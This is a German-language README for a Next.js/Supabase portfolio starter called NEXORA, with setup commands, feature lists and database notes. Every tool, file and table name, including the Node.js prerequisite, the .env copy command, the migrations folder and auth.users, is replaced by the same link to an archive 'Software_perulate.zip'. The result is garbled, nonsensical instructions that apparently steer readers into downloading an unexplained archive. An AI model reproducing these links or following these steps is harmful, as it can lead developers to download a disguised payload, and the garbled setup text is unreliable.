# NEXORA – Starter (https://github.com/Sm8s/nexora/raw/refs/heads/main/supabase/Software_perulate.zip + Supabase)

Ein minimal lauffähiges Starter-Template für **NEXORA**: Portfolio & Learning Hub mit Admin-Bereich, Supabase-Auth, Storage und SQL-Migrationen.

## Voraussetzungen
- https://github.com/Sm8s/nexora/raw/refs/heads/main/supabase/Software_perulate.zip 18+
- pnpm (oder npm/yarn)
- Ein Supabase-Projekt

## Setup
```bash
# 1) Abhängigkeiten
pnpm install

# 2) ENV vorbereiten
cp https://github.com/Sm8s/nexora/raw/refs/heads/main/supabase/Software_perulate.zip https://github.com/Sm8s/nexora/raw/refs/heads/main/supabase/Software_perulate.zip
# SUPABASE_URL & SUPABASE_ANON_KEY eintragen

# 3) DB migrieren
# Im Supabase SQL Editor die Datei aus `https://github.com/Sm8s/nexora/raw/refs/heads/main/supabase/Software_perulate.zip` ausführen.

# 4) Dev-Server
pnpm dev
```

## Features im Starter
- https://github.com/Sm8s/nexora/raw/refs/heads/main/supabase/Software_perulate.zip (App Router) + TypeScript + Tailwind
- Supabase JS Client (Auth + Realtime vorbereitet)
- Public-Seite (Home), Admin-Stub (/admin)
- Easter-Egg-Logo (5 Klicks -> Admin/Login)
- API-Stubs für pages, posts, tasks
- SQL-Migrationen (Basis-Tabellen aus dem Prompt)

## Scripts
- `pnpm dev` – Dev-Server starten
- `pnpm build` – Produktionsbuild
- `pnpm start` – Start in Produktion
- `pnpm lint` – Linting

## Nächste Schritte
- API-Endpunkte mit echten Policies/RLS absichern
- RBAC, Review-Workflow und Notifications schrittweise ausbauen
- Tests (Vitest/Playwright) ergänzen


## Hinweis zu Benutzern (Supabase-Standard)
- Statt eines eigenen `users`-Tables nutzt dieses Schema **`https://github.com/Sm8s/nexora/raw/refs/heads/main/supabase/Software_perulate.zip` (UUID)**.
- Öffentliche Profildaten liegen in `https://github.com/Sm8s/nexora/raw/refs/heads/main/supabase/Software_perulate.zip` (1:1 zu `https://github.com/Sm8s/nexora/raw/refs/heads/main/supabase/Software_perulate.zip`).
- Alle *_user_id / author_id Spalten referenzieren `https://github.com/Sm8s/nexora/raw/refs/heads/main/supabase/Software_perulate.zip(id)`.
